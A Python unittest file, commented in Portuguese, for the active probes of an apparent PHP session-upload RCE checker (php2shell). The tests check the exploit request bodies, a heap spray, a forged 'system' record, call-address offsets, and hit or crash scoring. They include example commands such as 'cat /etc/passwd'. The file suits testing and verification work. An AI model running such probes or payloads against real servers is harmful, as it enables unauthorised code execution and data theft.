# -*- coding: utf-8 -*-
"""Testes das sondas ativas do php2shell (CVE-2026-109618 / CVE-2026-109619)."""

import os
import sys
import unittest

RAIZ = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if RAIZ not in sys.path:
    sys.path.insert(0, RAIZ)

from php2shell import _combine_active  # noqa: E402
from php2shell_active import (  # noqa: E402
    Attempt, active_verdict, build_619_body, build_inject_body, build_micro_body,
    build_stall_body, command_fits_inline, discover_paths, forge_record,
    resolve_call_addr, score_attempt,
)


class CorpoMultipartTests(unittest.TestCase):
    def test_stall_tem_duas_fases_com_progresso_antes_do_arquivo(self):
        p1, p2 = build_stall_body('sid1')
        self.assertIn(b'name="PHP_SESSION_UPLOAD_PROGRESS"', p1)
        self.assertIn(b'name="file"', p1)
        self.assertLess(p1.index(b'PHP_SESSION_UPLOAD_PROGRESS'), p1.index(b'name="file"'))
        self.assertTrue(p2.rstrip().endswith(b'--'))

    def test_micro_fica_no_tamanho_do_writeup(self):
        body = build_micro_body('sid2')
        self.assertLess(len(body), 320)
        self.assertIn(b'name="PHPSESSID"', body)

    def test_inject_nao_tem_cookie_e_usa_nome_de_arquivo_canario(self):
        body = build_inject_body('sid3', filename='canary.txt')
        self.assertIn(b'filename="canary.txt"', body)
        self.assertIn(b'sid3', body)

    def test_619_tem_149_partes_de_spray(self):
        p1, _p2 = build_619_body('sid4', b'id', 0x7F0000)
        self.assertEqual(p1.count(b'name="t[]"'), 149)
        self.assertIn(b'system\x00id\x00', forge_record(0x7F0000, b'id'))


class OffsetTests(unittest.TestCase):
    def test_call_direto_vence(self):
        self.assertEqual(resolve_call_addr(0x100000, 0x200000), 0x200000)

    def test_call_derivado_do_dtor(self):
        self.assertEqual(resolve_call_addr(0x43EF0 + 0x1000, None), 0x1000)

    def test_sem_offsets_retorna_zero(self):
        self.assertEqual(resolve_call_addr(None, None), 0)

    def test_limite_de_14_bytes_do_poc(self):
        self.assertTrue(command_fits_inline('id'))
        self.assertTrue(command_fits_inline('id>/tmp/a'))
        self.assertFalse(command_fits_inline('cat /etc/passwd | head -n 20'))


class PontuacaoTests(unittest.TestCase):
    def test_fixacao_pontua_acima_de_upload_aceito(self):
        fix = Attempt('inject', 'http://x/', 's', session_fixation=True, status=200)
        ace = Attempt('micro', 'http://x/', 's', status=200)
        self.assertGreater(score_attempt(fix), score_attempt(ace))
        self.assertEqual(active_verdict(fix), 'session_fixation')

    def test_crash_e_reconhecido(self):
        att = Attempt('stall', 'http://x/', 's', crashed=True)
        self.assertEqual(active_verdict(att), 'crash_signal')

    def test_marcador_no_corpo_vira_rce_hit(self):
        att = Attempt('619', 'http://x/', 's', status=200, body=b'uid=33(www-data)')
        self.assertEqual(active_verdict(att, expect=b'uid='), 'rce_hit')

    def test_erro_de_rede_nao_pontua(self):
        att = Attempt('stall', 'http://x/', 's', error='timeout')
        self.assertEqual(score_attempt(att), 0)
        self.assertEqual(active_verdict(att), 'unreachable')


class CaminhosTests(unittest.TestCase):
    def test_pagina_informada_vem_primeiro(self):
        paths = discover_paths('https://x.invalid/login.php', max_paths=3)
        self.assertEqual(paths[0], '/login.php')
        self.assertIn('/index.php', paths)

    def test_raiz_nao_duplica_pagina(self):
        paths = discover_paths('https://x.invalid/', max_paths=4)
        self.assertEqual(paths[0], '/index.php')


class CombinacaoTests(unittest.TestCase):
    def test_ativo_promove_mas_nunca_rebaixa(self):
        self.assertEqual(_combine_active('PATCHED', 'session_fixation'), 'PRIMITIVE_CONFIRMED')
        self.assertEqual(_combine_active('PATCHED', 'rce_hit'), 'RCE_CONFIRMED')
        self.assertEqual(_combine_active('VULNERABLE', 'upload_accepted'), 'VULNERABLE')
        self.assertEqual(_combine_active('PATCHED', 'upload_accepted'), 'PATCHED')
        self.assertEqual(_combine_active('UNKNOWN', 'crash_signal'), 'CRASH_SIGNAL')


if __name__ == '__main__':
    unittest.main()